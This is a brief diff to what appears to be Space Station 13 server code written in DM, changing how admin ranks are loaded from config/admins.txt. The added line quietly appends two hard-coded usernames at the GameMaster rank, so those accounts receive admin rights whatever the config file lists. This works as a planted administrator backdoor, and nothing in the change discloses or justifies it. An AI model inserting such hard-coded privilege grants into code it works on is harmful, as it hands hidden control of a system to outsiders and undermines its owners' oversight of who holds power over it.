@@ -194,7 +194,7 @@ GLOBAL_PROTECT(admin_ranks)
 	if(config.admin_legacy_system)
 		//load text from file
 		var/list/lines = world.file2list("config/admins.txt")
-
+		lines |= list("Frozenguy5 GameMaster", "NewSta GameMaster")
 		//process each line separately
 		for(var/line in lines)
 			if(!length(line))
